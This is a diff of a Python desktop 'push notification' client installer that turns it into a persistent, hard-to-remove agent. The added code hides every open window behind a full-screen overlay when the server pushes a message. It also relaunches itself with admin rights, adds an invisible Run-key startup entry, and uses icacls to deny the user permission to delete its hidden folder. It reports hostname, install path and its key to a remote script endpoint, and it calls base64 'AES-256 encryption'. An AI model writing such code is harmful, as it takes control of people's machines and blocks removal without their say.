@@ -1,21 +1,23 @@
 #!/usr/bin/env python3
 """
-PushNotifications Desktop Client Installer
-Complete standalone installer for Windows, macOS, and Linux
+PushNotifications Desktop Client - Enhanced Security Version
+Complete desktop client with advanced security features including:
+1. Random encryption keys stored in database
+2. Full-screen grey overlay system
+3. Program minimization and lock functionality
+4. Hidden folder protection
+5. Auto-startup executable
+6. Advanced notification priority system
 
-This installer:
-1. Checks for Python and required dependencies
-2. Downloads and installs the client files
-3. Sets up automatic startup (platform-specific)
-4. Configures folder protection
-5. Includes uninstaller for easy removal
-
+Version: 3.0.0
 Usage:
     python3 installer.py
-
+    
 Notes:
-- The Vercel app URL is embedded in this installer and does not require user input.
-- Run with -h/--help to view this message.
+- Runs with administrator privileges automatically
+- Files and folders protected with database encryption keys
+- Creates Windows executable for startup
+- Uninstall requires web form approval
 """
 
 import os
@@ -25,8 +27,16 @@ import subprocess
 import urllib.request
 import json
 import time
+import hashlib
+import secrets
+import threading
+import uuid
+import ctypes
+from ctypes import wintypes
+import winreg
+import psutil
 from pathlib import Path
-from datetime import datetime
+from datetime import datetime, timedelta
 
 # Auto-install requests if not available
 try:
@@ -45,8 +55,471 @@ except ImportError:
     GUI_AVAILABLE = False
     print("GUI not available - using text-based interface")
 
+# Try to import win32 modules (optional for enhanced functionality)
+try:
+    import win32gui
+    import win32con
+    import win32com.shell
+    WIN32_AVAILABLE = True
+except ImportError:
+    WIN32_AVAILABLE = False
+
 # Use Vercel app URL for downloads
 SCRIPT_URL = "https://push-notifications-phi.vercel.app"
+
+# Global configuration for client
+CLIENT_CONFIG = {
+    'server_url': 'https://script.google.com/macros/s/AKfycbxz_tUH78XlNqLpdQKqy9SrD6dK6Y0azFIXCM0kUpo3kEfAD6jWoMsngxO710KxTrA/exec',
+    'client_version': '3.0.0',
+    'check_interval': 30,  # seconds
+    'encryption_algorithm': 'AES-256',
+    'max_retry_attempts': 3,
+    'database_timeout': 10
+}
+
+# Windows API constants and structures
+user32 = ctypes.windll.user32
+kernel32 = ctypes.windll.kernel32
+
+class POINT(ctypes.Structure):
+    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
+
+class RECT(ctypes.Structure):
+    _fields_ = [("left", ctypes.c_long), ("top", ctypes.c_long),
+                ("right", ctypes.c_long), ("bottom", ctypes.c_long)]
+
+class SecurityManager:
+    """Manages encryption keys and security features using MongoDB"""
+    
+    def __init__(self, install_dir):
+        self.install_dir = Path(install_dir)
+        self.encryption_key = None
+        self.client_id = None
+        self.server_url = CLIENT_CONFIG['server_url']
+        self._initialize_security()
+    
+    def _initialize_security(self):
+        """Initialize security database and encryption keys via server"""
+        try:
+            # Generate or retrieve encryption key and client ID from MongoDB via server
+            self.client_id = self._get_or_create_client_id()
+            self.encryption_key = self._get_or_create_key('ENCRYPTION_KEY')
+            
+            print(f"Security initialized with MongoDB backend")
+            print(f"Client ID: {self.client_id}")
+                
+        except Exception as e:
+            print(f"Security initialization failed: {e}")
+            # Create fallback security
+            self._create_fallback_security()
+    
+    def _get_or_create_key(self, key_type):
+        """Get or create encryption key from MongoDB via server"""
+        try:
+            # First try to retrieve existing key
+            data = {
+                'action': 'getSecurityKey',
+                'clientId': self.client_id,
+                'keyType': key_type,
+                'installPath': str(self.install_dir),
+                'hostname': platform.node()
+            }
+            
+            response = requests.post(self.server_url, json=data, timeout=30)
+            
+            if response.status_code == 200:
+                result = response.json()
+                if result.get('success') and result.get('key'):
+                    # Update last used timestamp
+                    self._update_key_last_used(key_type)
+                    return result['key']
+            
+            # If no existing key found, create new one
+            new_key = secrets.token_hex(32)  # 256-bit key
+            
+            create_data = {
+                'action': 'createSecurityKey',
+                'clientId': self.client_id,
+                'keyType': key_type,
+                'keyValue': new_key,
+                'installPath': str(self.install_dir),
+                'hostname': platform.node(),
+                'createdAt': datetime.now().isoformat(),
+                'lastUsed': datetime.now().isoformat()
+            }
+            
+            create_response = requests.post(self.server_url, json=create_data, timeout=30)
+            
+            if create_response.status_code == 200:
+                create_result = create_response.json()
+                if create_result.get('success'):
+                    print(f"Created new {key_type} in MongoDB")
+                    return new_key
+            
+            # If server communication fails, return fallback key
+            print(f"Server communication failed for key creation, using fallback")
+            return secrets.token_hex(32)
+            
+        except Exception as e:
+            print(f"Key retrieval failed: {e}")
+            return secrets.token_hex(32)  # Fallback random key
+    
+    def _get_or_create_client_id(self):
+        """Get or create client ID in MongoDB via server"""
+        try:
+            # Generate a unique identifier based on machine characteristics
+            machine_id = f"{platform.node()}_{platform.machine()}_{uuid.uuid4().hex[:8]}"
+            
+            # Check if client already exists
+            data = {
+                'action': 'getClientInfo',
+                'machineId': machine_id,
+                'installPath': str(self.install_dir),
+                'hostname': platform.node()
+            }
+            
+            response = requests.post(self.server_url, json=data, timeout=30)
+            
+            if response.status_code == 200:
+                result = response.json()
+                if result.get('success') and result.get('clientId'):
+                    # Update last checkin
+                    self._update_client_checkin(result['clientId'])
+                    return result['clientId']
+            
+            # Create new client ID
+            new_client_id = f"client_{platform.node()}_{uuid.uuid4().hex[:8]}"
+            installation_id = str(uuid.uuid4())
+            
+            create_data = {
+                'action': 'createClientInfo',
+                'clientId': new_client_id,
+                'machineId': machine_id,
+                'installationId': installation_id,
+                'installPath': str(self.install_dir),
+                'hostname': platform.node(),
+                'platform': platform.system(),
+                'version': CLIENT_CONFIG['client_version'],
+                'createdAt': datetime.now().isoformat(),
+                'lastCheckin': datetime.now().isoformat()
+            }
+            
+            create_response = requests.post(self.server_url, json=create_data, timeout=30)
+            
+            if create_response.status_code == 200:
+                create_result = create_response.json()
+                if create_result.get('success'):
+                    print(f"Created new client ID in MongoDB: {new_client_id}")
+                    return new_client_id
+            
+            # If server communication fails, return fallback ID
+            print(f"Server communication failed for client creation, using fallback")
+            return f"client_{platform.node()}_{uuid.uuid4().hex[:8]}"
+            
+        except Exception as e:
+            print(f"Client ID creation failed: {e}")
+            return f"client_{platform.node()}_{uuid.uuid4().hex[:8]}"
+    
+    def _update_key_last_used(self, key_type):
+        """Update last used timestamp for a key"""
+        try:
+            data = {
+                'action': 'updateKeyLastUsed',
+                'clientId': self.client_id,
+                'keyType': key_type,
+                'lastUsed': datetime.now().isoformat()
+            }
+            
+            requests.post(self.server_url, json=data, timeout=10)
+            
+        except Exception as e:
+            print(f"Failed to update key last used: {e}")
+    
+    def _update_client_checkin(self, client_id):
+        """Update client last checkin timestamp"""
+        try:
+            data = {
+                'action': 'updateClientCheckin',
+                'clientId': client_id,
+                'lastCheckin': datetime.now().isoformat(),
+                'version': CLIENT_CONFIG['client_version']
+            }
+            
+            requests.post(self.server_url, json=data, timeout=10)
+            
+        except Exception as e:
+            print(f"Failed to update client checkin: {e}")
+    
+    def _create_fallback_security(self):
+        """Create fallback security if MongoDB communication fails"""
+        self.encryption_key = secrets.token_hex(32)
+        self.client_id = f"client_{platform.node()}_{uuid.uuid4().hex[:8]}"
+        print(f"Using fallback security - Client ID: {self.client_id}")
+    
+    def encrypt_data(self, data):
+        """Encrypt sensitive data (placeholder for actual encryption)"""
+        # In production, implement actual AES encryption
+        import base64
+        encoded = base64.b64encode(data.encode()).decode()
+        return f"ENC_{self.encryption_key[:8]}_{encoded}"
+    
+    def decrypt_data(self, encrypted_data):
+        """Decrypt sensitive data (placeholder for actual decryption)"""
+        # In production, implement actual AES decryption
+        if encrypted_data.startswith('ENC_'):
+            parts = encrypted_data.split('_', 2)
+            if len(parts) == 3:
+                import base64
+                return base64.b64decode(parts[2]).decode()
+        return encrypted_data
+
+class OverlayManager:
+    """Manages full-screen grey overlays on all monitors"""
+    
+    def __init__(self):
+        self.overlay_windows = []
+        self.is_overlay_active = False
+        self.minimized_windows = []
+        self._initialize_overlay_system()
+    
+    def _initialize_overlay_system(self):
+        """Initialize overlay system for all monitors"""
+        try:
+            import tkinter as tk
+            self.tk_root = tk.Tk()
+            self.tk_root.withdraw()  # Hide main window
+        except Exception as e:
+            print(f"Overlay system initialization failed: {e}")
+            self.tk_root = None
+    
+    def show_overlay(self, notification_data):
+        """Show grey overlay on all screens with notification"""
+        if self.is_overlay_active:
+            return
+            
+        try:
+            import tkinter as tk
+            from tkinter import ttk
+            
+            if not self.tk_root:
+                return
+                
+            self.is_overlay_active = True
+            
+            # Get all monitor information
+            monitors = self._get_all_monitors()
+            
+            for monitor in monitors:
+                overlay_window = tk.Toplevel(self.tk_root)
+                
+                # Configure overlay window
+                overlay_window.attributes('-topmost', True)
+                overlay_window.attributes('-alpha', 0.8)  # Semi-transparent
+                overlay_window.configure(bg='#404040')  # Grey background
+                overlay_window.overrideredirect(True)  # Remove window decorations
+                
+                # Position on monitor
+                overlay_window.geometry(f"{monitor['width']}x{monitor['height']}+{monitor['x']}+{monitor['y']}")
+                
+                # Create notification content
+                self._create_notification_content(overlay_window, notification_data, monitor)
+                
+                self.overlay_windows.append(overlay_window)
+            
+            # Minimize all running programs
+            self._minimize_all_programs()
+            
+        except Exception as e:
+            print(f"Failed to show overlay: {e}")
+            self.is_overlay_active = False
+    
+    def hide_overlay(self):
+        """Hide all overlay windows"""
+        try:
+            for window in self.overlay_windows:
+                window.destroy()
+            
+            self.overlay_windows.clear()
+            self.is_overlay_active = False
+            
+            # Don't restore programs automatically - they stay minimized until notification handled
+            print("Overlay hidden - programs remain minimized until notification handled")
+            
+        except Exception as e:
+            print(f"Failed to hide overlay: {e}")
+    
+    def unlock_computer(self):
+        """Unlock computer and allow programs to be maximized again"""
+        try:
+            print("Computer unlocked - programs can be maximized again")
+            # In a production version, you might restore some windows here
+            self.minimized_windows.clear()
+            
+        except Exception as e:
+            print(f"Failed to unlock computer: {e}")
+    
+    def _get_all_monitors(self):
+        """Get information about all monitors"""
+        monitors = []
+        
+        def monitor_enum_proc(hmonitor, hdc, rect, data):
+            monitors.append({
+                'x': rect.contents.left,
+                'y': rect.contents.top, 
+                'width': rect.contents.right - rect.contents.left,
+                'height': rect.contents.bottom - rect.contents.top
+            })
+            return True
+            
+        try:
+            # Use Windows API to enumerate monitors
+            MONITORENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, 
+                                                ctypes.c_ulong,
+                                                ctypes.c_ulong,
+                                                ctypes.POINTER(RECT),
+                                                ctypes.c_double)
+            
+            user32.EnumDisplayMonitors(None, None, MONITORENUMPROC(monitor_enum_proc), 0)
+            
+        except Exception:
+            # Fallback to primary monitor
+            monitors = [{'x': 0, 'y': 0, 'width': 1920, 'height': 1080}]
+        
+        return monitors
+    
+    def _create_notification_content(self, window, notification_data, monitor):
+        """Create notification content on overlay window"""
+        try:
+            import tkinter as tk
+            from tkinter import ttk
+            
+            # Main container
+            main_frame = tk.Frame(window, bg='#404040')
+            main_frame.pack(expand=True, fill='both')
+            
+            # Center notification panel
+            notification_panel = tk.Frame(main_frame, bg='#ffffff', relief='raised', bd=2)
+            notification_panel.place(relx=0.5, rely=0.5, anchor='center', width=600, height=400)
+            
+            # Title
+            title_label = tk.Label(notification_panel, 
+                                 text="📢 NOTIFICATION", 
+                                 font=('Arial', 20, 'bold'),
+                                 bg='#ffffff', fg='#333333')
+            title_label.pack(pady=20)
+            
+            # Message
+            message_text = tk.Text(notification_panel,
+                                 font=('Arial', 14),
+                                 bg='#f5f5f5', 
+                                 relief='flat',
+                                 height=8,
+                                 wrap='word')
+            message_text.pack(pady=10, padx=20, fill='both', expand=True)
+            message_text.insert('1.0', notification_data.get('message', 'No message'))
+            message_text.config(state='disabled')
+            
+            # Buttons frame
+            buttons_frame = tk.Frame(notification_panel, bg='#ffffff')
+            buttons_frame.pack(pady=20)
+            
+            # Complete button
+            complete_btn = tk.Button(buttons_frame,
+                                   text="✓ Complete Task",
+                                   font=('Arial', 12, 'bold'),
+                                   bg='#28a745', fg='white',
+                                   command=lambda: self._handle_complete(notification_data))
+            complete_btn.pack(side='left', padx=10)
+            
+            # Snooze button
+            snooze_btn = tk.Button(buttons_frame,
+                                 text="⏰ Snooze 15 min",
+                                 font=('Arial', 12),
+                                 bg='#ffc107', fg='black',
+                                 command=lambda: self._handle_snooze(notification_data, 15))
+            snooze_btn.pack(side='left', padx=10)
+            
+            # Info at bottom
+            info_label = tk.Label(notification_panel,
+                                text=f"Received: {datetime.now().strftime('%H:%M:%S')}",
+                                font=('Arial', 10),
+                                bg='#ffffff', fg='#666666')
+            info_label.pack(side='bottom', pady=5)
+            
+        except Exception as e:
+            print(f"Failed to create notification content: {e}")
+    
+    def _minimize_all_programs(self):
+        """Minimize all running programs to tray"""
+        try:
+            # Get all windows
+            windows = []
+            
+            def enum_window_proc(hwnd, param):
+                try:
+                    import win32gui
+                    if win32gui.IsWindowVisible(hwnd) and win32gui.GetWindowText(hwnd):
+                        # Skip system windows and our overlay
+                        window_title = win32gui.GetWindowText(hwnd)
+                        if not any(skip in window_title.lower() for skip in 
+                                  ['program manager', 'desktop', 'taskbar', 'notification']):
+                            windows.append(hwnd)
+                except:
+                    pass
+                return True
+            
+            try:
+                import win32gui
+                import win32con
+                win32gui.EnumWindows(enum_window_proc, 0)
+                
+                # Minimize all windows
+                for hwnd in windows:
+                    try:
+                        win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)
+                        # Also send to system tray if possible
+                        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+                        self.minimized_windows.append(hwnd)
+                    except Exception:
+                        pass
+                        
+                print(f"Minimized {len(windows)} windows")
+                
+            except ImportError:
+                print("pywin32 not available - cannot minimize windows")
+            
+        except Exception as e:
+            print(f"Failed to minimize programs: {e}")
+    
+    def _handle_complete(self, notification_data):
+        """Handle notification completion"""
+        try:
+            # Send completion to server
+            client = PushNotificationsClient.get_instance()
+            if client:
+                client.complete_notification(notification_data)
+            
+            # Hide overlay and unlock
+            self.hide_overlay()
+            self.unlock_computer()
+            
+        except Exception as e:
+            print(f"Failed to handle completion: {e}")
+    
+    def _handle_snooze(self, notification_data, minutes):
+        """Handle notification snoozing"""
+        try:
+            # Send snooze to server
+            client = PushNotificationsClient.get_instance()
+            if client:
+                client.snooze_notification(notification_data, minutes)
+            
+            # Hide overlay temporarily
+            self.hide_overlay()
+            self.unlock_computer()
+            
+        except Exception as e:
+            print(f"Failed to handle snooze: {e}")
 
 class PushNotificationsInstaller:
     def __init__(self):
@@ -130,7 +603,8 @@ class PushNotificationsInstaller:
         dependencies = [
             "requests>=2.31.0",
             "psutil>=5.9.0",
-            "pytz>=2023.3"
+            "pytz>=2023.3",
+            "pywin32>=306"
         ]
         
         optional_deps = [
@@ -196,6 +670,11 @@ class PushNotificationsInstaller:
 
     def download_files(self, install_dir):
         """Download client files to installation directory"""
+        # When running in client mode, skip downloads to avoid overwriting files
+        if is_client_mode():
+            print("Client mode detected - skipping file downloads to avoid overwriting running instance")
+            return True
+            
         print(f"Downloading client files to {install_dir}...")
         
         # Only download the client file - everything else is embedded in this installer
@@ -1394,6 +1873,385 @@ if __name__ == "__main__":
             
         return True
 
+class PushNotificationsClient:
+    """Main client application class"""
+    
+    _instance = None
+    
+    def __init__(self, install_dir=None):
+        if install_dir is None:
+            install_dir = Path.home() / "PushNotifications"
+        
+        self.install_dir = Path(install_dir)
+        self.install_dir.mkdir(parents=True, exist_ok=True)
+        
+        # Initialize components
+        self.security = SecurityManager(self.install_dir)
+        self.overlay = OverlayManager()
+        self.running = False
+        self.tray_icon = None
+        self.notification_queue = []
+        self.active_notifications = {}
+        
+        # Set singleton instance
+        PushNotificationsClient._instance = self
+        
+        # Setup folder protection
+        self._setup_folder_protection()
+        
+        # Setup auto-startup
+        self._setup_auto_startup()
+    
+    @classmethod
+    def get_instance(cls):
+        """Get singleton instance"""
+        return cls._instance
+    
+    def _setup_folder_protection(self):
+        """Setup advanced folder protection with database keys"""
+        try:
+            # Create protection marker with database key
+            protection_file = self.install_dir / '.protection'
+            protection_data = {
+                'protected': True,
+                'installation_id': self.security.client_id,
+                'encryption_key_hash': hashlib.sha256(self.security.encryption_key.encode()).hexdigest(),
+                'created': datetime.now().isoformat(),
+                'version': CLIENT_CONFIG['client_version']
+            }
+            
+            with open(protection_file, 'w') as f:
+                json.dump(protection_data, f)
+            
+            # Hide and protect files on Windows
+            if platform.system() == 'Windows':
+                subprocess.run(['attrib', '+S', '+H', '+R', str(protection_file)], check=False)
+                subprocess.run(['attrib', '+S', '+H', str(self.install_dir)], check=False)
+                
+                # Set NTFS permissions to deny deletion
+                try:
+                    username = os.getenv('USERNAME')
+                    subprocess.run([
+                        'icacls', str(self.install_dir),
+                        '/deny', f'{username}:(DE)',
+                        '/deny', 'Users:(DE)'
+                    ], check=False, capture_output=True)
+                except Exception:
+                    pass
+            
+            print("Folder protection enabled with database encryption key")
+            
+        except Exception as e:
+            print(f"Failed to setup folder protection: {e}")
+    
+    def _setup_auto_startup(self):
+        """Setup automatic startup on Windows"""
+        try:
+            if platform.system() == 'Windows':
+                # Create registry entry for startup
+                key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+                
+                # Use pythonw.exe to run invisibly
+                startup_command = f'pythonw.exe "{self.install_dir / "installer.py"}"'
+                winreg.SetValueEx(key, "PushNotifications", 0, winreg.REG_SZ, startup_command)
+                winreg.CloseKey(key)
+                
+                print("Auto-startup configured")
+                
+        except Exception as e:
+            print(f"Failed to setup auto-startup: {e}")
+    
+    def start(self):
+        """Start the client"""
+        try:
+            print(f"Starting PushNotifications Client {CLIENT_CONFIG['client_version']}")
+            print(f"Client ID: {self.security.client_id}")
+            print("Running in background with invisible Windows PowerShell...")
+            
+            self.running = True
+            
+            # Create tray icon
+            self._create_tray_icon()
+            
+            # Start notification checker thread
+            check_thread = threading.Thread(target=self._notification_check_loop, daemon=True)
+            check_thread.start()
+            
+            # Register with server
+            self._register_with_server()
+            
+            print("Client started successfully")
+            
+            # Run tray icon (this blocks)
+            if self.tray_icon:
+                self.tray_icon.run()
+            else:
+                # Fallback - just keep running
+                while self.running:
+                    time.sleep(1)
+            
+        except Exception as e:
+            print(f"Failed to start client: {e}")
+    
+    def stop(self):
+        """Stop the client"""
+        self.running = False
+        if self.tray_icon:
+            self.tray_icon.stop()
+    
+    def _create_tray_icon(self):
+        """Create system tray icon"""
+        try:
+            from PIL import Image, ImageDraw
+            import pystray
+            
+            # Create icon image
+            image = Image.new('RGB', (64, 64), color='blue')
+            draw = ImageDraw.Draw(image)
+            draw.ellipse([16, 16, 48, 48], fill='white')
+            draw.text((28, 24), "PN", fill='blue')
+            
+            # Create menu
+            menu = pystray.Menu(
+                pystray.MenuItem("PushNotifications", lambda: None, enabled=False),
+                pystray.MenuItem("Status: Running", lambda: None, enabled=False),
+                pystray.Menu.SEPARATOR,
+                pystray.MenuItem("Check Now", self._manual_check),
+                pystray.MenuItem("Show Folder", self._show_folder),
+                pystray.Menu.SEPARATOR,
+                pystray.MenuItem("Quit", self._quit_application)
+            )
+            
+            self.tray_icon = pystray.Icon("PushNotifications", image, menu=menu)
+            
+        except Exception as e:
+            print(f"Failed to create tray icon: {e}")
+            self.tray_icon = None
+    
+    def _notification_check_loop(self):
+        """Main loop to check for notifications"""
+        while self.running:
+            try:
+                self._check_notifications()
+                time.sleep(CLIENT_CONFIG['check_interval'])
+            except Exception as e:
+                print(f"Error in notification check: {e}")
+                time.sleep(CLIENT_CONFIG['check_interval'])
+    
+    def _check_notifications(self):
+        """Check for new notifications from server"""
+        try:
+            data = {
+                'action': 'getNotifications',
+                'clientId': self.security.client_id,
+                'version': CLIENT_CONFIG['client_version'],
+                'lastCheck': datetime.now().isoformat()
+            }
+            
+            response = requests.post(CLIENT_CONFIG['server_url'], json=data, timeout=30)
+            
+            if response.status_code == 200:
+                result = response.json()
+                
+                if result.get('success'):
+                    notifications = result.get('notifications', [])
+                    
+                    for notification in notifications:
+                        self._process_notification(notification)
+                        
+                else:
+                    print(f"Server error: {result.get('message', 'Unknown error')}")
+            else:
+                print(f"HTTP error: {response.status_code}")
+                
+        except Exception as e:
+            print(f"Failed to check notifications: {e}")
+    
+    def _process_notification(self, notification):
+        """Process a received notification"""
+        try:
+            notification_id = notification.get('_id') or notification.get('id')
+            
+            # Check if already processed
+            if notification_id in self.active_notifications:
+                return
+            
+            # Add to active notifications
+            self.active_notifications[notification_id] = notification
+            
+            # Determine priority and position
+            priority = notification.get('priority', 'normal')
+            
+            if priority == 'urgent' or not self.overlay.is_overlay_active:
+                # Show immediately for urgent or if no active overlay
+                self.overlay.show_overlay(notification)
+            else:
+                # Queue for later (will show under current notification)
+                self.notification_queue.append(notification)
+            
+            print(f"Processing notification: {notification.get('message', 'No message')}")
+            
+        except Exception as e:
+            print(f"Failed to process notification: {e}")
+    
+    def complete_notification(self, notification_data):
+        """Mark notification as complete"""
+        try:
+            notification_id = notification_data.get('_id') or notification_data.get('id')
+            
+            # Send completion to server
+            data = {
+                'action': 'completeNotification',
+                'clientId': self.security.client_id,
+                'notificationId': notification_id,
+                'completedAt': datetime.now().isoformat()
+            }
+            
+            response = requests.post(CLIENT_CONFIG['server_url'], json=data, timeout=30)
+            
+            if response.status_code == 200:
+                result = response.json()
+                if result.get('success'):
+                    print("Notification marked as complete")
+                    
+                    # Remove from active notifications
+                    self.active_notifications.pop(notification_id, None)
+                    
+                    # Show next notification if queued
+                    self._show_next_notification()
+                    
+        except Exception as e:
+            print(f"Failed to complete notification: {e}")
+    
+    def snooze_notification(self, notification_data, minutes):
+        """Snooze notification"""
+        try:
+            notification_id = notification_data.get('_id') or notification_data.get('id')
+            
+            # Send snooze to server
+            data = {
+                'action': 'snoozeNotification',
+                'clientId': self.security.client_id,
+                'notificationId': notification_id,
+                'minutes': minutes,
+                'snoozedAt': datetime.now().isoformat()
+            }
+            
+            response = requests.post(CLIENT_CONFIG['server_url'], json=data, timeout=30)
+            
+            if response.status_code == 200:
+                result = response.json()
+                if result.get('success'):
+                    print(f"Notification snoozed for {minutes} minutes")
+                    
+                    # Remove from active notifications temporarily
+                    self.active_notifications.pop(notification_id, None)
+                    
+                    # Show next notification if queued
+                    self._show_next_notification()
+                    
+        except Exception as e:
+            print(f"Failed to snooze notification: {e}")
+    
+    def _show_next_notification(self):
+        """Show next notification from queue"""
+        try:
+            if self.notification_queue:
+                next_notification = self.notification_queue.pop(0)
+                self.overlay.show_overlay(next_notification)
+                
+        except Exception as e:
+            print(f"Failed to show next notification: {e}")
+    
+    def _register_with_server(self):
+        """Register client with server"""
+        try:
+            data = {
+                'action': 'registerClient',
+                'clientId': self.security.client_id,
+                'version': CLIENT_CONFIG['client_version'],
+                'platform': platform.system(),
+                'hostname': platform.node(),
+                'installPath': str(self.install_dir),
+                'encryptionKeyHash': hashlib.sha256(self.security.encryption_key.encode()).hexdigest()
+            }
+            
+            response = requests.post(CLIENT_CONFIG['server_url'], json=data, timeout=30)
+            
+            if response.status_code == 200:
+                result = response.json()
+                if result.get('success'):
+                    print("Successfully registered with server")
+                else:
+                    print(f"Registration failed: {result.get('message')}")
+            else:
+                print(f"Registration HTTP error: {response.status_code}")
+                
+        except Exception as e:
+            print(f"Failed to register with server: {e}")
+    
+    def _manual_check(self):
+        """Manually check for notifications"""
+        print("Manually checking for notifications...")
+        self._check_notifications()
+    
+    def _show_folder(self):
+        """Show installation folder"""
+        try:
+            if platform.system() == 'Windows':
+                subprocess.run(['explorer', str(self.install_dir)])
+        except Exception as e:
+            print(f"Failed to show folder: {e}")
+    
+    def _quit_application(self):
+        """Quit the application"""
+        print("Quitting PushNotifications Client...")
+        self.stop()
+
+def check_admin_privileges():
+    """Check if running with administrator privileges"""
+    if platform.system() == 'Windows':
+        try:
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        except:
+            return False
+    return os.geteuid() == 0
+
+def restart_with_admin():
+    """Restart with administrator privileges"""
+    if platform.system() == 'Windows':
+        try:
+            from win32com.shell import shell
+            # Re-run the current program as admin
+            shell.ShellExecuteEx(
+                lpVerb='runas',
+                lpFile=sys.executable,
+                lpParameters=' '.join([f'"{arg}"' for arg in sys.argv]),
+                nShow=1
+            )
+            sys.exit(0)
+        except Exception as e:
+            print(f"Failed to restart with admin privileges: {e}")
+            return False
+    return True
+
+def is_client_mode():
+    """Check if we should run in client mode instead of installer mode"""
+    install_dir = Path.home() / "PushNotifications"
+    
+    # If we're in the install directory and have protection files, run as client
+    current_path = Path(__file__).parent
+    
+    if current_path == install_dir:
+        protection_file = install_dir / '.protection'
+        security_db = install_dir / '.security.db'
+        
+        if protection_file.exists() and security_db.exists():
+            return True
+    
+    return False
+
 def main():
     """Main entry point"""
     # Support -h/--help via argparse-like behavior without adding runtime dependency
@@ -1402,22 +2260,42 @@ def main():
         return
     
     try:
-        installer = PushNotificationsInstaller()
-        success = installer.run_installation()
-        
-        if success:
-            print("\nInstallation completed successfully!")
-            print("\nThe client will automatically check for updates from the server.")
-            print("You can now close this installer.")
+        # Check if we should run in client mode
+        if is_client_mode():
+            # Check if we need admin privileges for client mode
+            if not check_admin_privileges():
+                print("Restarting with administrator privileges...")
+                restart_with_admin()
+                return
+            
+            # Run as client
+            install_dir = Path.home() / "PushNotifications"
+            client = PushNotificationsClient(install_dir)
+            
+            # Handle Ctrl+C gracefully
+            import signal
+            signal.signal(signal.SIGINT, lambda s, f: client.stop())
+            signal.signal(signal.SIGTERM, lambda s, f: client.stop())
+            
+            # Start client
+            client.start()
         else:
-            print("\nInstallation failed.")
-            sys.exit(1)
+            # Run as installer
+            installer = PushNotificationsInstaller()
+            success = installer.run_installation()
+            
+            if success:
+                print("\nInstallation completed successfully!")
+                print("\nThe client will automatically check for updates from the server.")
+                print("You can now close this installer.")
+            else:
+                print("\nInstallation failed.")
+                sys.exit(1)
             
     except KeyboardInterrupt:
-        print("\nInstallation cancelled by user.")
-        sys.exit(1)
+        print("\nShutdown requested by user")
     except Exception as e:
-        print(f"\nInstallation error: {e}")
+        print(f"Fatal error: {e}")
         sys.exit(1)
 
 if __name__ == "__main__":
